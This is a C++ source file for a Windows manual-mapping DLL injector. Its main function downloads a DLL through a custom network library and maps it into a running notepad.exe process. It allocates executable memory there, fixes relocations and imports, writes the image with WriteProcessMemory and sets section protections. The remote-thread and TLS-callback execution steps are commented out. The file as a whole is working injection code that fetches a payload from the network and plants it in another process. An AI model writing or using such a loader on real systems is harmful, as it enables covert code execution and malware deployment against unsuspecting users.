//cl /EHsc .\manual.cpp /link user32.lib /OUT:manual.exe
#include <windows.h>
#include <iostream>
#include <vector>
#include <tlhelp32.h>

#define DEBUG_HEADERS 0
#define DEBUG_SECTIONS 0
#define DEBUG_RELOC 0
#define DEBUG_IMPORTS 0

LPCSTR dllPath_n = "network_lib.dll";

typedef int (*SendDataFunc)(const std::string&, const std::string&);
typedef std::string (*RecvDataFunc)(const std::string&);
typedef std::vector<unsigned char> (*RecvDataRawFunc)(const std::string&);

SendDataFunc send_data;
RecvDataFunc receive_data;
RecvDataRawFunc receive_data_raw;

DWORD GetProcessID(const wchar_t* processName)
{
    DWORD pid = 0;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot != INVALID_HANDLE_VALUE)
    {
        PROCESSENTRY32W pe;
        pe.dwSize = sizeof(pe);
        if (Process32FirstW(hSnapshot, &pe))
        {
            do
            {
                if (_wcsicmp(pe.szExeFile, processName) == 0)
                {
                    pid = pe.th32ProcessID;
                    break;
                }
            } while (Process32NextW(hSnapshot, &pe));
        }
        CloseHandle(hSnapshot);
    }
    return pid;
}

void* FindExportAddress(HMODULE hModule, const char* funcName)
{
    IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)hModule;
    IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)((BYTE*)hModule + dosHeader->e_lfanew);

    IMAGE_EXPORT_DIRECTORY* exportDir = (IMAGE_EXPORT_DIRECTORY*)((BYTE*)hModule + ntHeaders->OptionalHeader.DataDirectory[0].VirtualAddress);

    DWORD* nameRVAs = (DWORD*)((BYTE*)hModule + exportDir->AddressOfNames);
    WORD* ordRVAs = (WORD*)((BYTE*)hModule + exportDir->AddressOfNameOrdinals);
    DWORD* funcRVAs = (DWORD*)((BYTE*)hModule + exportDir->AddressOfFunctions);
    for (DWORD i = 0; i < exportDir->NumberOfNames; ++i)
    {
        char* funcNameFromExport = (char*)((BYTE*)hModule + nameRVAs[i]);
        if (strcmp(funcNameFromExport, funcName) == 0)
        {
            DWORD funcRVA = funcRVAs[ordRVAs[i]];
            return (void*)((BYTE*)hModule + funcRVA);

        }
    }
    std::string errorMsg = "Failed to find export address for function: ";
    errorMsg += funcName;
    MessageBoxA(NULL, errorMsg.c_str(), "Error", MB_OK);
    return nullptr;
}

void load_dll()                                             
{
    HMODULE N_dll = LoadLibraryA("network_lib.dll");
    if (N_dll == nullptr) std::cerr << "Failed to load DLL: " << GetLastError() << std::endl;

    receive_data_raw = (RecvDataRawFunc)FindExportAddress(N_dll, "?receive_data_raw@@YA?AV?$vector@EV?$allocator@E@std@@@std@@AEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@@Z");
    send_data = (SendDataFunc)FindExportAddress(N_dll, "?send_data@@YAHAEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@0@Z");    
    receive_data = (RecvDataFunc)FindExportAddress(N_dll, "?receive_data@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEBV12@@Z");

}

bool InjectDLL(DWORD pid, std::vector <unsigned char> *downloaded_dll)
{

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess)
    {
        std::cerr << "Failed to open process: " << GetLastError() << std::endl;
        return true;
    }

    //===================================================================================================

    BYTE* localDLL = downloaded_dll->data();

    IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)localDLL;
    IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)(localDLL + dosHeader->e_lfanew);
    IMAGE_SECTION_HEADER* sectionHeader = (IMAGE_SECTION_HEADER*)((BYTE*)ntHeaders + sizeof(IMAGE_NT_HEADERS));

    
    std::vector<BYTE> fullImage(ntHeaders->OptionalHeader.SizeOfImage, 0);
    
    
    IMAGE_DATA_DIRECTORY relocDir = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    IMAGE_BASE_RELOCATION* reloc = (IMAGE_BASE_RELOCATION*)(fullImage.data() + relocDir.VirtualAddress);

    IMAGE_DATA_DIRECTORY importDir = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    IMAGE_IMPORT_DESCRIPTOR* importDesc = (IMAGE_IMPORT_DESCRIPTOR*)(fullImage.data() + importDir.VirtualAddress);
    
    IMAGE_DATA_DIRECTORY tlsDir = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];
    typedef VOID (WINAPI *PIMAGE_TLS_CALLBACK)(PVOID DllHandle, DWORD Reason, PVOID Reserved);
    
    //===================================================================================================

    for(int i=0;i<50;i++)std::cout << "="; std::cout << "\n\n";
    std::cout << " Size of the Image           : 0x" << std::hex << ntHeaders->OptionalHeader.SizeOfImage << std::endl;
    std::cout << " Image Base                  : 0x" << std::hex << ntHeaders->OptionalHeader.ImageBase << std::dec << std::endl;
    std::cout << " Number of Sections          : " << ntHeaders->FileHeader.NumberOfSections << std::endl;
    std::cout << " Size of Headers             : 0x" << std::hex << ntHeaders->OptionalHeader.SizeOfHeaders << std::endl;
    std::cout << " Base of Code                : 0x" << std::hex << ntHeaders->OptionalHeader.BaseOfCode << std::dec << std::endl;
    std::cout << std::endl; for(int i=0;i<50;i++)std::cout << "="; std::cout << "\n\n";

    //======================================================================================================================================================================

    // Write headers
    std::cout << "-> Trying to write headers " << std::endl;
    memcpy(fullImage.data(), localDLL, ntHeaders->OptionalHeader.SizeOfHeaders);
    std::cout << "\t[wrote headers]\n" << std::endl;

    #if DEBUG_HEADERS
        for(int i=0;i<15;i++)std::cout << "=";std::cout << "HEADER_DEBUGGING";for(int i=0;i<15;i++)std::cout << "=";std::cout << std::endl;
        
        std::cout << "Size of headers: 0x" << std::hex << ntHeaders->OptionalHeader.SizeOfHeaders << " bytes" << std::endl;      
        std::cout << "First address used by headers: 0x" << std::hex << (uintptr_t)fullImage.data() << std::dec << std::endl;
        std::cout << "Last address used by headers: 0x" << std::hex << ((uintptr_t)fullImage.data() + ntHeaders->OptionalHeader.SizeOfHeaders) - 1 << std::endl; 

        for(int i=0;i<15;i++)std::cout << "=";std::cout << "DEBUGGING";for(int i=0;i<15;i++)std::cout << "=";std::cout << std::endl << std::endl;
    #endif
    //======================================================================================================================================================================

    // Write sections

    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++)
    {
        void* sectionDest = fullImage.data() + sectionHeader[i].VirtualAddress;
        void* sectionSrc = localDLL + sectionHeader[i].PointerToRawData;
        memcpy(sectionDest, sectionSrc, sectionHeader[i].SizeOfRawData);

        std::cout << "-> Allocated Section : " << sectionHeader[i].Name << std::endl;
    }   std::cout << "\t[Allocation Done]\n" << std::endl;

    #if DEBUG_SECTIONS
    for(int i=0;i<15;i++)std::cout << "=";std::cout << "SECTION_DEBUGGING";for(int i=0;i<15;i++)std::cout << "=";std::cout << std::endl;
    
        for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++)
        {
            void* sectionDest = fullImage.data() + sectionHeader[i].VirtualAddress;
            std::cout << "-> Section Name: " << sectionHeader[i].Name;
            std::cout << "Section Size: 0x" << std::hex << sectionHeader[i].SizeOfRawData << " bytes" << std::endl;
            std::cout << "Section from [0x" << std::hex << (uintptr_t(sectionDest)) << "]  -> [0x" << (uintptr_t(sectionDest) + sectionHeader[i].SizeOfRawData - 1) << "]";
            
            std::cout << "\tTrue size [0x" << std::hex << ((uintptr_t(sectionDest) + sectionHeader[i].SizeOfRawData) - (uintptr_t(sectionDest))) << "]"; if(i == ntHeaders->FileHeader.NumberOfSections - 1) std::cout << std::endl;
            if(i < ntHeaders->FileHeader.NumberOfSections - 1) std::cout << "\tPadding [0x" << std::hex << ((uintptr_t(fullImage.data() + sectionHeader[i+1].VirtualAddress)) - (uintptr_t(sectionDest) + sectionHeader[i].SizeOfRawData)) << "]"; if(i != ntHeaders->FileHeader.NumberOfSections) std::cout <<std::endl;
        }

    for(int i=0;i<15;i++)std::cout << "=";std::cout << "SECTION_DEBUGGING";for(int i=0;i<15;i++)std::cout << "=";std::cout << std::endl << std::endl;
    #endif

    //======================================================================================================================================================================

    // Allocate memory for full DLL image
    std::cout << "-> Trying to allocate at 0x" << std::hex << ntHeaders->OptionalHeader.ImageBase;
    void* remoteMem = VirtualAllocEx(hProcess, (LPVOID)ntHeaders->OptionalHeader.ImageBase, ntHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteMem)
    {
        remoteMem = VirtualAllocEx(hProcess, nullptr, ntHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); std::cout << "\t[FAIL]\n-> Trying random spot " << std::endl;
        if (!remoteMem)
        {
            std::cerr << "## Failed to allocate memory in target process: " << GetLastError() << std::endl;
            return false;
        }
    }   std::cout << "\t[allocated memory at: 0x" << std::hex << remoteMem << "]\n" << std::endl;

    //======================================================================================================================================================================

    // Resolve relocations if the base address has changed

    if ((LPVOID)ntHeaders->OptionalHeader.ImageBase != remoteMem)
    {
        std::cout << "Base Change -> \nExpected: 0x" << std::hex << ntHeaders->OptionalHeader.ImageBase << " Actual: 0x" << remoteMem; 
    
        if (relocDir.Size)
        {
            SIZE_T delta = (SIZE_T)remoteMem - ntHeaders->OptionalHeader.ImageBase;
            std::cout << std::endl << "\tDelta: [0x" << std::hex << delta << "]" << std::endl; 
    
            while (reloc->VirtualAddress)
            {
                int numEntries = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
                WORD* entry = (WORD*)((BYTE*)reloc + sizeof(IMAGE_BASE_RELOCATION));
                
                #if DEBUG_RELOC
                    std::cout << "No of Entries in reloc = " << std::hex << numEntries << std::endl << std::endl;
                #endif

                for (int i = 0; i < numEntries; i++)
                {
                    int type = entry[i] >> 12;
                    int offset = entry[i] & 0xFFF;
    
                    if (type == IMAGE_REL_BASED_ABSOLUTE)
                    {
                        #if DEBUG_RELOC
                            std::cout << "\t[===========Absolute relocation found. Skipping...============]" << std::endl << std::endl;
                        #endif
                            
                        continue;
                    }
                    else if (type == IMAGE_REL_BASED_HIGHLOW || type == IMAGE_REL_BASED_DIR64)
                    {
                        DWORD_PTR* patchAddr = (DWORD_PTR*)((BYTE*)fullImage.data() + reloc->VirtualAddress + offset);
                        DWORD_PTR oldValue = *patchAddr;
                        DWORD_PTR newValue = oldValue + delta;
                        *patchAddr = newValue;
                        
                        #if DEBUG_RELOC 
                            std::cout << "Patching Address: 0x" << std::hex << patchAddr << "  [0x" << oldValue << "] -> [0x" << newValue << "]   [" << i + 1 << "/" << numEntries << "]" << std::dec << std::endl;
                        #endif
                    }
                    else std::cerr << "Unknown relocation type: " << type << std::endl;
                }
                reloc = (IMAGE_BASE_RELOCATION*)((BYTE*)reloc + reloc->SizeOfBlock);
            }
        }
        std::cout << "\t[Relocation completed]" << std::endl;
    }
    else std::cout << "\t[No need to relocate]" << std::endl;

    //======================================================================================================================================================================

    // Resolve imports
    
    std::cout << std::endl << "-> Resolving imports" << std::endl << "importDir Size: 0x" << std::hex << importDir.Size << std::dec << std::endl;
    if (importDir.Size)
    {
        while (importDesc->Name)
        {
            char* libraryName = (char*)(fullImage.data() + importDesc->Name);
            HMODULE hModule = LoadLibraryA(libraryName);
            if (!hModule)
            {
                std::cerr << "Failed to load library: " << libraryName << std::endl;
                return false;
            } std::cout << "-> Loaded library: " << libraryName << std::endl;

            #ifdef _WIN64
                IMAGE_THUNK_DATA64* originalFirstThunk = (IMAGE_THUNK_DATA64*)(fullImage.data() + importDesc->OriginalFirstThunk);
                IMAGE_THUNK_DATA64* firstThunk = (IMAGE_THUNK_DATA64*)(fullImage.data() + importDesc->FirstThunk);

                while (originalFirstThunk->u1.AddressOfData)
                {
                    ULONGLONG* targetAddress = (ULONGLONG*)firstThunk;
                    ULONGLONG funcAddr = 0;
                    if (originalFirstThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG64)
                        funcAddr = (ULONGLONG)GetProcAddress(hModule, (LPCSTR)(originalFirstThunk->u1.Ordinal & 0xFFFF));
                    else
                    {
                        IMAGE_IMPORT_BY_NAME* importByName = (IMAGE_IMPORT_BY_NAME*)(fullImage.data() + originalFirstThunk->u1.AddressOfData);
                        funcAddr = (ULONGLONG)GetProcAddress(hModule, importByName->Name);
                    }

                    *targetAddress = funcAddr;
                    originalFirstThunk++;
                    firstThunk++;

                    #if DEBUG_IMPORTS
                        std::cout << "-> Wrote function address [0x" << std::hex << funcAddr << "] -> [0x" << targetAddress << "]" << std::dec << std::endl;
                    #endif

                }
            #else
                IMAGE_THUNK_DATA32* originalFirstThunk = (IMAGE_THUNK_DATA32*)(fullImage.data() + importDesc->OriginalFirstThunk);
                IMAGE_THUNK_DATA32* firstThunk = (IMAGE_THUNK_DATA32*)(fullImage.data() + importDesc->FirstThunk);

                while (originalFirstThunk->u1.AddressOfData)
                {
                    DWORD* targetAddress = (DWORD*)firstThunk;
                    DWORD funcAddr = 0;
                    if (originalFirstThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG32)
                        funcAddr = (DWORD)GetProcAddress(hModule, (LPCSTR)(originalFirstThunk->u1.Ordinal & 0xFFFF));
                    else
                    {
                        IMAGE_IMPORT_BY_NAME* importByName = (IMAGE_IMPORT_BY_NAME*)(fullImage.data() + originalFirstThunk->u1.AddressOfData);
                        funcAddr = (DWORD)GetProcAddress(hModule, importByName->Name);
                    }
                    *targetAddress = funcAddr;
                    originalFirstThunk++;
                    firstThunk++;

                    #if DEBUG_IMPORTS
                        std::cout << "-> Wrote function address [0x" << std::hex << funcAddr << "] -> [0x" << targetAddress << "]" << std::dec << std::endl;
                    #endif
                }
            #endif

            importDesc++;
        }
    }   std::cout << "\t[Imports resolved]" << std::endl;

    //======================================================================================================================================================================

    // Write full image to target process

    if (!WriteProcessMemory(hProcess, remoteMem, fullImage.data(), fullImage.size(), nullptr))
    {
        std::cerr << "Failed to write full image to target process: " << GetLastError() << std::endl;
        return false;
    }
    std::cout << "-> Full image injection complete" << std::endl;
    
    //======================================================================================================================================================================

    //Set memory protection for sections

    std::cout << "\n\n-> Setting memory protection for sections" << std::endl << "No. of sections : " << ntHeaders->FileHeader.NumberOfSections << std::endl;

    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++)
    {
        DWORD oldProtect;
        void* sectionAddr = (BYTE*)remoteMem + sectionHeader[i].VirtualAddress;
        DWORD newProtect = PAGE_READONLY;

        if ((sectionHeader[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) && (sectionHeader[i].Characteristics & IMAGE_SCN_MEM_WRITE))
            newProtect = PAGE_EXECUTE_READWRITE;
        else if (sectionHeader[i].Characteristics & IMAGE_SCN_MEM_EXECUTE)
            newProtect = PAGE_EXECUTE_READ;
        else if (sectionHeader[i].Characteristics & IMAGE_SCN_MEM_WRITE)
            newProtect = PAGE_READWRITE;

        VirtualProtectEx(hProcess, sectionAddr, sectionHeader[i].Misc.VirtualSize, newProtect, &oldProtect);
        std::cout << "-> memory permission set for section: " << sectionHeader[i].Name << "\t[" << std::hex << oldProtect << "] -> [" << newProtect << "]" << std::dec << std::endl;
    }

    //======================================================================================================================================================================


    // TlsCallbacks

    // if(tlsDir.Size == 0) 
    // {
    //     std::cout << "\n-> No TLS Dir found" << std::endl;
    // }
    // else
    // {
    //     #ifdef _WIN64
            
    //         IMAGE_TLS_DIRECTORY64* tls = (IMAGE_TLS_DIRECTORY64*)(fullImage.data() + tlsDir.VirtualAddress);
    //         if(!tls -> AddressOfCallBacks)
    //         {
    //             std::cout << "\n-> No TLS Callbacks found" << std::endl;   
    //             return true;
    //         }
    //         ULONGLONG* callback = (ULONGLONG*)tls->AddressOfCallBacks;
        
    //     #else

    //         IMAGE_TLS_DIRECTORY32* tls32 = (IMAGE_TLS_DIRECTORY32*)(fullImage.data() + tlsDir.VirtualAddress);
    //         if (!tls32 -> AddressOfCallBacks) {
    //             std::cout << "\n-> No TLS Callbacks found" << std::endl;
    //             return true;
    //         }
    //         DWORD* callbacks = (DWORD*)tls32 -> AddressOfCallBacks;        

    //     #endif

    //     std::cout << "-> Executing TLS callbacks..." << std::endl;

    //     while (true)
    //     {
    //         #ifdef _WIN64
    //             ULONGLONG callbackAddr = *callback;
    //             if (callbackAddr == 0) break;
                
    //             PIMAGE_TLS_CALLBACK tls_callback = (PIMAGE_TLS_CALLBACK)callbackAddr;
    //             std::cout << "-> Calling TLS callback at address: 0x" << std::hex << (uintptr_t)tls_callback << std::dec << std::endl;
                
    //             tls_callback(fullImage.data(), DLL_PROCESS_ATTACH, nullptr);
    //             callback++;
    //         #else
    //             DWORD callbackAddr = *callbacks;
    //             if (callbackAddr == 0) break;
                
    //             PIMAGE_TLS_CALLBACK tls_callback = (PIMAGE_TLS_CALLBACK)callbackAddr;
    //             std::cout << "-> Calling TLS callback at address: 0x" << std::hex << (uintptr_t)tls_callback << std::dec << std::endl;
                
    //             tls_callback(fullImage.data(), DLL_PROCESS_ATTACH, nullptr);
    //             callbacks++;
    //         #endif
    //     }
    //     std::cout << "\t[TLS callbacks executed]" << std::endl;
    // }

    //======================================================================================================================================================================

    // void* entryPoint = (BYTE*)remoteMem + ntHeaders->OptionalHeader.AddressOfEntryPoint;
    // HANDLE hThread = CreateRemoteThread(hProcess, nullptr, 0, (LPTHREAD_START_ROUTINE)entryPoint, remoteMem, 0, nullptr);
    // if (!hThread)
    // {
    //     std::cerr << "Failed to create remote thread: " << GetLastError() << std::endl;
    //     return false;
    // }
    // CloseHandle(hThread);
    // CloseHandle(hProcess);

    return true;

}

int main()
{
    load_dll();
 
    std::vector <unsigned char> downloaded_dll = receive_data_raw("cute_lib.dll");
    //std::vector <unsigned char> downloaded_dll = receive_data_raw("AudioEndpointBuilder.dll");

    std::cout << "Trying to get a handle to the process...\n"; 
    DWORD processID = GetProcessID(L"notepad.exe");
    if (processID == 0)
    {
        std::cerr << "[-] Target process not found.\n";
        return 1;
    } std::cout << "Process ID: " << processID << "\n";

    try
    {
        if (InjectDLL(processID, &downloaded_dll)) std::cout << "\n[+] DLL successfully injected!\n";
        else std::cerr << "[-] DLL injection failed.\n";
    }
    catch(const std::exception& e)
    {
        std::cerr << e.what() << '\n';
    }

    return 0;
}